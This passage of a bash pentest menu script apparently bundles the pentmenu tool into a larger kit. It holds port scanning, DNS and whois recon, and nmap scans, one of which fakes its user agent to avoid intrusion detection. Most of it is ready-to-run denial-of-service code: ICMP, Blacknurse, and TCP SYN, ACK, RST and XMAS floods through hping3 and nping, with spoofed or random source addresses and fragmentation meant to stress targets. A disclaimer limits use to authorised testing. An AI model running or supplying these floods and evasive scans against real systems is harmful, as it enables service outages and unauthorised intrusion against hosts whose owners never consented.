			read_all 'ENTER PORT RANGE FOR SCAN AND PRESS [ENTER]' ; range_port="$r_a"
			reset_broken
			for (( PORT = 1; PORT < range_port; ++PORT )); do
				nc -vz -w 1 "$n_ip" "$PORT" &>"/dev/null"
				if [ $? -eq 0 ]; then
					ColorGreen "Open port $PORT$clear\033[0K\r\n"
				elif [ "$broken" -eq 1 ]; then
					break
				fi
			done & displaySpinner Scan in progress Please wait... ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Recon SSL/TLS SSLScan
##
ssl_scan() {
	Info_Screen '-Scanning TLS/SSL configuration with SSLscan
-SSLscan is a command-line tool example: sslscan google.com:443
-Requirements: SSLSCAN'
	install_package sslscan SSLSCAN
	scan_all sslscan --no-failed
}
##
#----Recon phone number lookup
##
phone_lookup() {
	Info_Screen '-Phone number lookup 555-555-5555
-curl https://www.phonelookup.com'
	user_agent_random
	read_all 'ENTER PHONE NUMBER TO LOOKUP AND PRESS [ENTER]'
	curl -sk -A "$userAgent" https://www.phonelookup.com/1/"$r_a" | grep -e "h[14]" | head -n14 | sed -e "s/^\s*//" -e "s/\s*$//" -e "s/<[^>]*>//g" | sed '1c\ '
}
##
#----Recon check dns leak test
##
leak_dns() {
	Info_Screen '-DNS leak test
-Author: macvk https://github.com/macvk/dnsleaktest
-The test shows DNS leaks and your external IP.
-If you use the same ASN for DNS and connection - you have no
leak, otherwise here might be a problem.
-BY https://bash.ws/'
	local api_domain='bash.ws'
	local error_code=1
	increment_error_code() {
		error_code=$((error_code + 1))
	}
	echo_bold() {
		echo -e "$yellow$1$clear"
	}
	echo_error() {
		(>&2 echo -e "$red$1$clear")
	}
	program_exit() {
		command -v "$1" > /dev/null
		if [ $? -ne 0 ]; then
			echo_error "Please, install \"$1\""
			$error_code
		fi
		increment_error_code
	}
check_internet_connection() {
	user_agent_random
	curl -k -A "$userAgent" --silent --head --request GET "https://${api_domain}" | grep "200 OK" > /dev/null
	if [ $? -ne 0 ]; then
		echo_error "No internet connection."
		$error_code
	fi
	increment_error_code
	}
	program_exit curl
	program_exit ping
	check_internet_connection
	if command -v jq &> /dev/null; then
		jq_exists=1
	else
		jq_exists=0
	fi
	if hash shuf 2>/dev/null; then
		id=$(shuf -i 1000000-9999999 -n 1)
	else
		id=$(jot -w %i -r 1 1000000 9999999)
	fi
	for i in $(seq 1 10); do
		ping -c 1 "${i}.${id}.${api_domain}" > /dev/null 2>&1
	done
	print_servers() {
	if (( $jq_exists )); then
		echo "$result_json" | \
		jq --monochrome-output \
		--raw-output \
		".[] | select(.type == \"${1}\") | \"\(.ip)\(if .country_name != \"\" and .country_name != false then \" [\(.country_name)\(if .asn != \"\" and .asn != false then \" \(.asn)\" else \"\" end)]\" else \"\" end)\""
	else
		while IFS= read -r line; do
			if [[ "$line" != *${1} ]]; then
				continue
			fi
			ip=$(echo "$line" | cut -d'|' -f 1)
			code=$(echo "$line" | cut -d'|' -f 2)
			country=$(echo "$line" | cut -d'|' -f 3)
			asn=$(echo "$line" | cut -d'|' -f 4)
			if [ -z "${ip// }" ]; then
				continue
			fi
			if [ -z "${country// }" ]; then
				echo "$ip"
			else
				if [ -z "${asn// }" ]; then
					echo "$ip [$country]"
				else
					echo "$ip [$country, $asn]"
				fi
			fi
		done <<< "$result_txt"
	fi
}
	if (( $jq_exists )); then
		result_json=$(curl -k --silent "https://${api_domain}/dnsleak/test/${id}?json")
	else
		result_txt=$(curl -k --silent "https://${api_domain}/dnsleak/test/${id}?txt")
	fi
	dns_count=$(print_servers "dns" | wc -l)
	echo_bold "Your IP:"
	print_servers "ip"
	echo ""
	if [ "$dns_count" -eq "0" ]; then
		echo_bold "No DNS servers found"
	else
		if [ "$dns_count" -eq "1" ]; then
			echo_bold "You use $dns_count DNS server:"
		else
			echo_bold "You use $dns_count DNS servers:"
		fi
		print_servers "dns"
	fi
	echo ""
	echo_bold "Conclusion:"
	print_servers "conclusion"
}
##
#----Recon pentmenu dos flood attack & recon scans by Chris Spillane
##
pentmenu() {
	Info_Screen "-Welcome to pentmenu!
Big thanks to Chris Spillane - GinjaChris, xorond, ayvdaualo
-This software is only for responsible, authorised use.
-YOU are responsible for your own actions!
-https://github.com/GinjaChris/pentmenu/blob/master/pentmenu
-Requirements:
-bash, curl, netcat, hping3 or nping, openssl, stunnel,
-nmap, whois, dnsutils, ike-scan"
install_package whois WHOIS
install_package host HOST
install_package hping3 HPING3
install_package dnsutils DNSUTILS
#install_package stunnel STUNNEL
install_package ike-scan IKE-SCAN
##
#----Recon pentmenu main menu
##
mainmenu() {
Info_Screen "Welcome to
    ________  _______  _       _________ _______  _______  _                
   |  ____  ||  ____ \| \    /|\__   __/|  ___  ||  ____ \| \    /||\     /|
   | |    | || |    \/|  \  | |   | |   | || || || |    \/|  \  | || |   | |
   | |____| || |__    |   \ | |   | |   | || || || |__    |   \ | || |   | |
   |  ______||  __)   | |\ \| |   | |   | ||_|| ||  __)   | |\ \| || |   | |
   | |       | |      | | \   |   | |   | |   | || |      | | \   || |   | |
   | |       | |____/\| |  \  |   | |   | |   | || |____/\| |  \  || |___| |
   |/        (_______/|/    \_|   |_|   |/     \||_______/|/    \_||_______|

-Author: Chris Spillane - GinjaChris"
	MenuTitle 'PENTMENU MAIN MENU'
	MenuColor 20 1 'PENTMENU RECON MENU'
	MenuColor 20 2 'PENTMENU DOS MENU'
	MenuColor 20 3 'EXTRACTION MENU'
	MenuColor 20 4 'VIEW README'
	MenuColor 20 5 'RETURN TO MAIN MENU'
	MenuEnd 19
	case "$m_a" in
		1) reconmenu ;;
		2) dosmenu ;;
		3) extractionmenu ;;
		4) showreadme ; mainmenu ;;
		5) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; mainmenu ;;
		[pP]) Panic_button ;; [bB]) croc_recon ;; *) invalid_entry ; mainmenu ;;
	esac
}
##
#----Recon pentmenu recon menu
##
reconmenu() {
	Info_Screen '-RECON MODULES
-Show IP uses curl to perform a lookup of your external IP.
-DNS Recon passive recon, performs a DNS lookup and whois lookup of the target.
-Ping Sweep nmap to perform ICMP echo ping against the target host or network.
-Quick Scan TCP Port scanner using nmap to scan open ports using TCP SYN scan.
-Detailed Scan uses nmap to identify live hosts, open ports, attempts OS id.
-UDP scan uses nmap to scan for open UDP ports. All UDP ports are scanned.
-Check Server Uptime on target by querying an open TCP port with hping3.
-IPsec Scan attempts to identify the presence of IPsec VPN server with ike-scan.'
	MenuTitle 'PENTMENU RECON SCAN MENU'
	MenuColor 20 1 'SHOW IP'
	MenuColor 20 2 'DNS RECON'
	MenuColor 20 3 'PING SWEEP'
	MenuColor 20 4 'QUICK SCAN'
	MenuColor 20 5 'DETAILED SCAN'
	MenuColor 20 6 'UDP SCAN'
	MenuColor 20 7 'CHECK SERVER UPTIME'
	MenuColor 20 8 'IPsec SCAN'
	MenuColor 20 9 'RETURN TO MAIN MENU'
	MenuEnd 19
	case "$m_a" in
		1) showip ; reconmenu ;;
		2) dnsrecon ; reconmenu ;;
		3) pingsweep ; reconmenu ;;
		4) quickscan ; reconmenu ;;
		5) detailedscan ; reconmenu ;;
		6) udpscan ; reconmenu ;;
		7) checkuptime ; reconmenu ;;
		8) ipsecscan ; reconmenu ;;
		9) mainmenu ;;
		0) exit ;;
		lock) Lock_keyboard ; reconmenu ;;
		[pP]) Panic_button ;; [bB]) mainmenu ;; *) invalid_entry ; reconmenu ;;
	esac
}
##
#----Recon pentmenu input Target ip/host
##
target_input() {
	read_all 'ENTER TARGET HOSTNAME OR IP' ; TARGET="$r_a"
}
##
#----Recon pentmenu input Target port
##
target_input_port() {
	read_all 'ENTER PORT DEFAULT IS 80' ; PORT="$r_a"
}
##
#----Recon pentmenu START SHOW IP
##
showip() {
	Info_Screen 'External IP lookup uses curl...'
	user_agent_random
	#---use curl to lookup external IP
	ColorYellow 'External IP is detected as: ' ; curl -A "$userAgent" https://icanhazip.com/s/
	#----show interface IP's
	ColorYellow 'Interface IPs are:\n'
	ip a | grep inet
	#----if ip a command fails revert to ifconfig
	if ! [[ $? = 0 ]]; then
		ifconfig | grep inet
	fi
}
##
#----Recon pentmenu START DNS RECON
##
dnsrecon() {
	Info_Screen '-This module performs passive recon via forward/reverse name lookups
-for the target as appropriate and performs a whois lookup'
	#----need a target IP/hostname to check
	target_input
	host "$TARGET"
	#----if host command doesnt work try nslookup instead
	if ! [[ $? = 0 ]]; then
		nslookup "$TARGET"
	fi
	#----run a whois lookup on the target
	sleep 1 && whois -H "$TARGET"
	if ! [[ $? = 0 ]]; then
	#----if whois fails, do a curl lookup to ipinfo.io
		user_agent_random
		sleep 1 && curl -A "$userAgent" ipinfo.io/"$TARGET"
	fi
	reconmenu
}
##
#----Recon pentmenu START PING SWEEP
##
pingsweep() {
	Info_Screen '-This module performs a simple ICMP echo ping sweep'
	#----need to know the subnet to scan for live hosts using pings
	target_input
	#----this could be done with ping command, but that is extremely difficult to code in bash for unusual subnets so we use nmap instead
	nmap -sP -PE "$TARGET" --reason
}
##
#----Recon pentmenu START QUICK SCAN
##
quickscan() {
	Info_Screen '-This module conducts a scan using nmap
-Depending on the target, the scan might take a long time to finish'
	#----we need to know where to scan. Whilst a hostname is possible, this module is designed to scan a subnet range
	target_input
	#----How fast should we scan the target?
	#----Faster speed is more likely to be detected by IDS, but is less waiting around
	ColorYellow 'Enter the speed of scan (0 means very slow and 5 means fast).
	Slower scans are more subtle, but faster means less waiting around.\n'
	read_all 'Default is 3' ; SPEED="$r_a"
	: ${SPEED:=3}
	nmap -Pn -sS -T "$SPEED" "$TARGET" --reason
}
##
#----Recon pentmenu START DETAILED SCAN
##
detailedscan() {
	Info_Screen '-This module performs a scan using nmap
-This scan might take a very long time to finish, please be patient'
	#----need a target hostname/IP
	target_input
	#----How fast should we scan the target?
	#----Faster speed is more likely to be detected by IDS, but is less waiting around
	ColorYellow 'Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.\n'
	read_all 'Default is 3' ; SPEED="$r_a"
	: ${SPEED:=3}
	#----scan using nmap. Note the change in user-agent from the default nmap value to help avoid detection
	user_agent_random
	nmap -script-args http.useragent="$userAgent" -Pn -p 1-65535 -sV -sC -A -O -T "$SPEED" "$TARGET" --reason
}
##
#----Recon pentmenu START UDP SCAN
##
udpscan() {
	Info_Screen '-It scans ALL ports on the target system. This may take some time, please be patient'
	#----need a target IP/hostname
	target_input
	#----How fast should we scan the target?
	#----Faster speed is more likely to be detected by IDS, but is less waiting around
	ColorYellow 'Enter the speed of scan (0 means very slow and 5 means fast).
Slower scans are more subtle, but faster means less waiting around.\n'
	read_all 'Default is 3' ; SPEED="$r_a"
	: ${SPEED:=3}
	#----launch the scan using nmap
	nmap -Pn -p 1-65535 -sU -T "$SPEED" "$TARGET" --reason
}
##
#----Recon pentmenu START CHECK UPTIME
##
checkuptime() {
	Info_Screen '-This module will attempt to estimate the uptime of a given server, using hping3
-This is not guaranteed to work'
	#----need a target IP/hostname
	target_input
	#----need a target port
	target_input_port
	: ${PORT:=80}
	dos_port_check
	#----how many times to retry the check?
	read_all 'Retries? 3 is ideal and default, 2 might also work' ; RETRY="$r_a"
	: ${RETRY:=3}
	ColorGreen 'Starting..\n'
	#----use hping3 and enable the TCP timestamp option, and try to guess the timestamp update frequency and the remote system uptime.
	#----this might not work, but sometimes it does work very well
	hping3 --tcp-timestamp -S "$TARGET" -p "$PORT" -c "$RETRY" | grep uptime
	ColorGreen 'Done.\n'
}
##
#----Recon pentmenu START IPSEC SCAN
##
#----we need to know where to scan
ipsecscan() {
	target_input
	#----Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256
	ENCLIST="1 5 7/128 7/192 7/256"
	#----Hash algorithms: MD5, SHA1, SHA-256, SHA-384 and SHA-512
	HASHLIST="1 2 4 5 6"
	#----Authentication methods: Pre-Shared Key, RSA Signatures, Hybrid Mode and XAUTH
	AUTHLIST="1 3 64221 65001"
	#----Diffie-Hellman groups: 1, 2, 5 and 12
	GROUPLIST="1 2 5 12"
	for ENC in "$ENCLIST"; do
		for HASH in "$HASHLIST"; do
			for AUTH in "$AUTHLIST"; do
				for GROUP in "$GROUPLIST"; do
				echo "--trans=$ENC,$HASH,$AUTH,$GROUP" | xargs --max-lines=8 ike-scan --retry=1 -R -M "$TARGET" | grep -v "Starting" | grep -v "0 returned handshake; 0 returned notify"
				done
			done
		done
	done
}
##
#----Recon pentmenu DOS menu
##
dosmenu() {
	Info_Screen '-DOS MODULES
-ICMP Echo Flood hping3 launch a traditional ICMP Echo flood against the target.
-ICMP Blacknurse Flood hping3 to launch an ICMP flood against the target.
-TCP SYN Flood sends a flood of TCP SYN packets using hping3.
-TCP ACK Flood offers the same options as the SYN flood.
-TCP RST Flood offers the same options as the SYN flood, RST Reset TCP flag.
-TCP XMAS Flood similar to the SYN and ACK floods, with the same options.
-UDP Flood like TCP SYN Flood but instead sends UDP packets specified host:port.
-SSL DOS uses OpenSSL to attempt to DOS a target host:port.
-Slowloris - uses netcat to slowly send HTTP Headers to the target host:port.
-IPsec DOS ike-scan attempt to flood the specified IP with Main mode-Aggressive
-Distraction Scan not really a DOS attack but launches multiple TCP SYN scans.
-DNS NXDOMAIN Flood attack uses netcat and designed to stress test DNS server '
	MenuTitle 'PENTMENU DOS FLOOD MENU'
	MenuColor 21 1 'ICMP ECHO FLOOD'
	MenuColor 21 2 'ICMP BLACKNURSE'
	MenuColor 21 3 'TCP SYN FLOOD'
	MenuColor 21 4 'TCP ACK FLOOD'
	MenuColor 21 5 'TCP RST FLOOD'
	MenuColor 21 6 'TCP XMAS FLOOD'
	MenuColor 21 7 'UDP FLOOD'
	MenuColor 21 8 'SSL DOS'
	MenuColor 21 9 'SLOWLORIS'
	MenuColor 20 10 'IPsec DOS'
	MenuColor 20 11 'DISTRACTION SCAN'
	MenuColor 20 12 'DNS NXDOMAIN FLOOD'
	MenuColor 20 13 'RETURN TO MAIN MENU'
	MenuEnd 20
	case "$m_a" in
		1) icmpflood ; dosmenu ;;
		2) blacknurse ; dosmenu ;;
		3) synflood ; dosmenu ;;
		4) ackflood ; dosmenu ;;
		5) rstflood ; dosmenu ;;
		6) xmasflood ; dosmenu ;;
		7) udpflood ; dosmenu ;;
		8) ssldos ; dosmenu ;;
		9) slowloris ; dosmenu ;;
		10) ipsecdos ; dosmenu ;;
		11) distractionscan ; dosmenu ;;
		12) nxdomainflood ; dosmenu ;;
		13) mainmenu ;;
		0) exit ;;
		lock) Lock_keyboard ; dosmenu ;;
		[pP]) Panic_button ;; [bB]) mainmenu ;; *) invalid_entry ; dosmenu ;;
	esac
}
#----check a valid integer is given for the port, anything else is invalid
dos_port_check() {
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
		PORT=80 && ColorRed "Invalid port,$(ColorYellow ' reverting to port 80')\n"
	elif [ "$PORT" -lt "1" ]; then
		PORT=80 && ColorRed "Invalid port number chosen!$(ColorYellow ' Reverting port 80')\n"
	elif [ "$PORT" -gt "65535" ]; then
		PORT=80 && ColorRed "Invalid port number chosen!$(ColorYellow ' Reverting port 80')\n"
	else
		ColorYellow "Using Port$(ColorGreen "$PORT")\n"
	fi
}
##
#----Recon pentmenu START ICMP FLOOD
##
icmpflood() {
	Info_Screen '-Preparing to launch ICMP Echo Flood using hping3'
	#----need a target IP/hostname
	target_input
	#----What source address to use? Manually defined, or random, or outgoing interface IP?
	read_all 'Enter Source IP, or [r]andom or [i]nterface IP default' ; SOURE="$r_a"
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ $validate_ip ]]; then
		ColorGreen 'Starting ICMP echo Flood. Use Ctrl c to end and return to menu\n'
		hping3 -1 --flood --spoof "$SOURCE" "$TARGET"
	elif [ "$SOURCE" = "r" ]; then
		ColorGreen 'Starting ICMP echo Flood. Use Ctrl c to end and return to menu\n'
		hping3 -1 --flood --rand-source "$TARGET"
	elif [ "$SOURCE" = "i" ]; then
		ColorGreen 'Starting ICMP echo Flood. Use Ctrl c to end and return to menu\n'
		hping3 -1 --flood "$TARGET"
	else
		ColorRed 'Not a valid option!  Using interface IP\n'
		ColorGreen 'Starting ICMP echo Flood. Use Ctrl c to end and return to menu\n'
		hping3 -1 --flood "$TARGET"
	fi
}
##
#----Recon pentmenu START BLACK NURSE
##
blacknurse() {
	Info_Screen 'Preparing to launch ICMP Blacknurse Flood using hping3'
	#----need a target IP/hostname
	target_input
	#----What source address to use? Manually defined, or random, or outgoing interface IP?
	read_all 'Enter Source IP, or [r]andom or [i]nterface IP default' ; SOURE="$r_a"
	: ${SOURCE:=i}
	if [[ "$SOURCE" =~ $validate_ip ]]; then
		ColorGreen 'Starting Blacknurse Flood. Use Ctrl c to end and return to menu\n'
		hping3 -1 -C 3 -K 3 --flood --spoof "$SOURCE" "$TARGET"
	elif [ "$SOURCE" = "r" ]; then
		ColorGreen 'Starting Blacknurse Flood. Use Ctrl c to end and return to menu\n'
		hping3 -1 -C 3 -K 3 --flood --rand-source "$TARGET"
	elif [ "$SOURCE" = "i" ]; then
		ColorGreen 'Starting Blacknurse Flood. Use Ctrl c to end and return to menu\n'
		hping3 -1 -C 3 -K 3 --flood "$TARGET"
	else
		ColorRed 'Not a valid option!  Using interface IP\n'
		ColorGreen 'Starting Blacknurse Flood. Use Ctrl c to end and return to menu\n'
		hping3 -1 -C 3 -K 3 --flood "$TARGET"
	fi
}
##
#----Recon pentmenu START TCP SYN FLOOD
##
synflood() {
	Info_Screen 'TCP SYN Flood uses hping3...checking for hping3...'
	if test -f "/usr/sbin/hping3"; then
		ColorGreen 'hping3 found, continuing!\n';
		#----hping3 is found, so use that for TCP SYN Flood
		#----need a target IP/hostname
		target_input
		#----need a port to send TCP SYN packets to
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----What source address to use? Manually defined, or random, or outgoing interface IP?
		read_all 'Enter Source IP, or [r]andom or [i]nterface IP default' ; SOURE="$r_a"
		: ${SOURCE:=i}
		#----should any data be sent with the SYN packet? Default is to send no data
		read_all 'Send data with SYN packet? [y]es or [n]o default' ; SENDDATA="$r_a"
		: ${SENDDATA:=n}
		if [[ $SENDDATA = y ]]; then
			#----we've chosen to send data, so how much should we send?
			read_all 'Enter number of data bytes to send default 3000' ; DATA="$r_a"
			: ${DATA:=3000}
			#----If not an integer is entered, use default
			if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
				DATA=3000 && ColorRed "Invalid integer! $(ColorGreen 'Using data length of 3000 bytes')\n"
			fi
		#----if $SENDDATA is not equal to y (yes) then send no data
		else
			DATA=0
		fi
		#----note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
		#----fragmentation should therefore place more stress on the target system
		if [[ "$SOURCE" =~ $validate_ip ]]; then
			ColorYellow 'Starting TCP SYN Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --frag --spoof "$SOURCE" -p "$PORT" -S "$TARGET"
		elif [ "$SOURCE" = "r" ]; then
			ColorYellow 'Starting TCP SYN Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --frag --rand-source -p "$PORT" -S "$TARGET"
		elif [ "$SOURCE" = "i" ]; then
			ColorYellow 'Starting TCP SYN Flood. Use Ctrl c to end and return to menu\n'
			hping3 -d "$DATA" --flood --frag -p "$PORT" -S "$TARGET"
		else
			ColorRed "Not a valid option! $(ColorYellow 'Using interface IP')\n"
			ColorYellow 'Starting TCP SYN Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --frag -p "$PORT" -S "$TARGET"
		fi
	#----No hping3 so using nping for TCP SYN Flood
	else
		ColorRed "hping3 not found :( $(ColorYellow 'trying nping instead')\n"
		ColorYellow 'Trying TCP SYN Flood with nping..this will work but is not ideal\n'
		#----need a valid target ip/hostname
		target_input
		#----need a valid target port
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----define source IP or use outgoing interface IP
		read_all 'Enter Source IP or use [i]nterface IP default' ; SOURCE="$r_a"
		: ${SOURCE:=i}
		#----How many packets to send per second?  default is 10k
		read_all 'Enter number of packets to send per second default is 10,000' ; RATE="$r_a"
		: ${RATE:=10000}
		#----default is 100k, so using default values will send 10k packets per second for 10 seconds
		read_all 'Enter total number of packets to send default is 100,000' ; TOTAL="$r_a"
		: ${TOTAL:=100000}
		ColorGreen 'Starting TCP SYN Flood...\n'
		#----begin TCP SYN flood using values defined earlier
		if 	[ "$SOURCE" = "i" ]; then
			nping --tcp --dest-port "$PORT" --flags syn --rate "$RATE" -c "$TOTAL" -v-1 "$TARGET"
		else
			nping --tcp --dest-port "$PORT" --flags syn --rate "$RATE" -c "$TOTAL" -v-1 -S "$SOURCE" "$TARGET"
		fi
	fi
}
##
#----Recon pentmenu START TCP ACK FLOOD
##
ackflood() {
	Info_Screen 'TCP ACK Flood uses hping3...checking for hping3...'
	if test -f "/usr/sbin/hping3"; then
		ColorGreen 'hping3 found, continuing!\n';
		#----hping3 is found, so use that for TCP ACK Flood
		target_input
		#----need a port to send TCP ACK packets to
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----What source address to use? Manually defined, or random, or outgoing interface IP?
		read_all 'Enter Source IP, or [r]andom or [i]nterface IP default' ; SOURCE="$r_a"
		: ${SOURCE:=i}
		#----should any data be sent with the ACK packet?  Default is to send no data
		read_all 'Send data with ACK packet? [y]es or [n]o default' ; SENDDATA="$r_a"
		: ${SENDDATA:=n}
		if [[ $SENDDATA = y ]]; then
			#----we've chosen to send data, so how much should we send?
			read_all 'Enter number of data bytes to send default 3000' ; DATA="$r_a"
			: ${DATA:=3000}
			#----If not an integer is entered, use default
			if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
				DATA=3000 && ColorRed "Invalid integer! $(ColorYellow 'Using data length of 3000 bytes')\n"
			fi
		#if $SENDDATA is not equal to y (yes) then send no data
		else
			DATA=0
		fi
		#----start TCP ACK flood using values defined earlier
		#----note that virtual fragmentation is set. The default for hping3 is 16 bytes.
		#----fragmentation should therefore place more stress on the target system
		if [[ "$SOURCE" =~ $validate_ip ]]; then
			ColorGreen 'Starting TCP ACK Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --frag --spoof "$SOURCE" -p "$PORT" -A "$TARGET"
		elif [ "$SOURCE" = "r" ]; then
			ColorGreen 'Starting TCP ACK Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --frag --rand-source -p "$PORT" -A "$TARGET"
		elif [ "$SOURCE" = "i" ]; then
			ColorGreen 'Starting TCP ACK Flood. Use Ctrl c to end and return to menu\n'
			hping3 -d "$DATA" --flood --frag -p "$PORT" -A "$TARGET"
		else
			ColorRed 'Not a valid option!  Using interface IP\n'
			ColorGreen 'Starting TCP ACK Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --frag -p "$PORT" -A "$TARGET"
		fi
	#----No hping3 so using nping for TCP ACK Flood
	else
		ColorRed "hping3 not found :( $(ColorYellow 'trying nping instead')\n"
		ColorYellow 'Trying TCP ACK Flood with nping..this will work but is not ideal\n'
		#----need a valid target ip/hostname
		target_input
		#----need a valid target port
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----define source IP or use outgoing interface IP
		read_all 'Enter Source IP or use [i]nterface IP default' ; SOURE="$r_a"
		: ${SOURCE:=i}
		#----How many packets to send per second?  default is 10k
		read_all 'Enter number of packets to send per second default is 10,000' ; RATE="$r_a"
		: ${RATE:=10000}
		#----default is 100k, so using default values will send 10k packets per second for 10 seconds
		read_all 'Enter total number of packets to send default is 100,000' ; TOTAL="$r_a"
		: ${TOTAL:=100000}
		ColorGreen 'Starting TCP ACK Flood...\n'
		#----begin TCP ACK flood using values defined earlier
		if [ "$SOURCE" = "i" ]; then
			nping --tcp --dest-port "$PORT" --flags ack --rate "$RATE" -c "$TOTAL" -v-1 "$TARGET"
		else
			nping --tcp --dest-port "$PORT" --flags ack --rate "$RATE" -c "$TOTAL" -v-1 -S "$SOURCE" "$TARGET"
		fi
	fi
}
##
#----Recon pentmenu START TCP RST FLOOD
##
rstflood() {
	Info_Screen '-TCP RST Flood uses hping3...checking for hping3...'
	if test -f "/usr/sbin/hping3"; then
		ColorGreen 'hping3 found, continuing!\n';
		#----hping3 is found, so use that for TCP RST Flood
		target_input
		#----need a port to send TCP RST packets to
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----What source address to use? Manually defined, or random, or outgoing interface IP?
		read_all 'Enter Source IP, or [r]andom or [i]nterface IP default' ; SOURE="$r_a"
		: ${SOURCE:=i}
		#----should any data be sent with the RST packet?  Default is to send no data
		read_all 'Send data with RST packet? [y]es or [n]o default' ; SENDDATA="$r_a"
		: ${SENDDATA:=n}
		if [[ "$SENDDATA" = y ]]; then
			#----we've chosen to send data, so how much should we send?
			read_all 'Enter number of data bytes to send default 3000' ; DATA="$r_a"
			: ${DATA:=3000}
			#----If not an integer is entered, use default
			if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
				DATA=3000 && ColorRed "Invalid integer! $(ColorYellow 'Using data length of 3000 bytes')\n"
			fi
		#----if $SENDDATA is not equal to y (yes) then send no data
		else
			DATA=0
		fi
		#----start TCP RST flood using values defined earlier
		#----note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
		#----fragmentation should therefore place more stress on the target system
		if [[ "$SOURCE" =~ $validate_ip ]]; then
			ColorGreen 'Starting TCP RST Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --frag --spoof "$SOURCE" -p "$PORT" -R "$TARGET"
		elif [ "$SOURCE" = "r" ]; then
			ColorGreen 'Starting TCP RST Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --frag --rand-source -p "$PORT" -R "$TARGET"
		elif [ "$SOURCE" = "i" ]; then
			ColorGreen 'Starting TCP RST Flood. Use Ctrl c to end and return to menu\n'
			hping3 -d "$DATA" --flood --frag -p "$PORT" -R "$TARGET"
		else
			ColorRed 'Not a valid option! Using interface IP\n'
			ColorGreen 'Starting TCP RST Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --frag -p "$PORT" -R "$TARGET"
		fi
	#----No hping3 so using nping for TCP RST Flood
	else
		ColorRed "hping3 not found :( $(ColorYellow 'trying nping instead')\n"
		ColorYellow 'Trying TCP RST Flood with nping..this will work but is not ideal\n'
		#----need a valid target ip/hostname
		target_input
		#----need a valid target port
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----define source IP or use outgoing interface IP
		read_all 'Enter Source IP or use [i]nterface IP default' ; SOURE="$r_a"
		: ${SOURCE:=i}
		#----How many packets to send per second?  default is 10k
		read_all 'Enter number of packets to send per second default is 10,000' ; RATE="$r_a"
		: ${RATE:=10000}
		#----default is 100k, so using default values will send 10k packets per second for 10 seconds
		read_all 'Enter total number of packets to send default is 100,000' ; TOTAL="$r_a"
		: ${TOTAL:=100000}
		ColorGreen 'Starting TCP RST Flood...\n'
		#----begin TCP RST flood using values defined earlier
		if [ "$SOURCE" = "i" ]; then
			nping --tcp --dest-port "$PORT" --flags rst --rate "$RATE" -c "$TOTAL" -v-1 "$TARGET"
		else
			nping --tcp --dest-port "$PORT" --flags rst --rate "$RATE" -c "$TOTAL" -v-1 -S "$SOURCE" "$TARGET"
		fi
	fi
}
##
#----Recon pentmenu START TCP XMAS FLOOD
##
xmasflood() {
	Info_Screen '-TCP XMAS Flood uses hping3...checking for hping3...'
	if test -f "/usr/sbin/hping3"; then
		ColorGreen 'hping3 found, continuing!\n';
		#----hping3 is found, so use that for TCP XMAS Flood
		#----need a target IP/hostname
		target_input
		#----need a port to send TCP XMAS packets to
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----What source address to use? Manually defined, or random, or outgoing interface IP?
		read_all 'Enter Source IP, or [r]andom or [i]nterface IP default' ; SOURE="$r_a"
		: ${SOURCE:=i}
		#----should any data be sent with the XMAS packet?  Default is to send no data
		read_all 'Send data with XMAS packet? [y]es or [n]o default' ; SENDDATA="$r_a"
		: ${SENDDATA:=n}
		if [[ $SENDDATA = y ]]; then
			#----we've chosen to send data, so how much should we send?
			read_all 'Enter number of data bytes to send default 3000' ; DATA="$r_a"
			: ${DATA:=3000}
			#----If not an integer is entered, use default
			if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
				DATA=3000 && ColorRed "Invalid integer! $(ColorYellow 'Using data length of 3000 bytes')\n"
			fi
		#----if $SENDDATA is not equal to y (yes) then send no data
		else
			DATA=0
		fi
		#----start TCP XMAS flood using values defined earlier
		if [[ "$SOURCE" =~ $validate_ip ]]; then
			ColorGreen 'Starting TCP XMAS Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --spoof $SOURCE -p $PORT -F -S -R -P -A -U -X -Y "$TARGET"
		elif [ "$SOURCE" = "r" ]; then
			ColorGreen 'Starting TCP XMAS Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" --rand-source -p "$PORT" -F -S -R -P -A -U -X -Y "$TARGET"
		elif [ "$SOURCE" = "i" ]; then
			ColorGreen 'Starting TCP XMAS Flood. Use Ctrl c to end and return to menu\n'
			hping3 -d $DATA --flood -p "$PORT" -F -S -R -P -A -U -X -Y "$TARGET"
		else
			ColorRed "Not a valid option! $(ColorYellow 'Using interface IP')\n"
			ColorGreen 'Starting TCP XMAS Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood -d "$DATA" -p "$PORT" -F -S -R -P -A -U -X -Y "$TARGET"
		fi
	#----No hping3 so using nping for TCP RST Flood
	else
		ColorRed "hping3 not found :( $(ColorYellow 'trying nping instead')\n"
		ColorYellow 'Trying TCP XMAS Flood with nping..this will work but is not ideal\n'
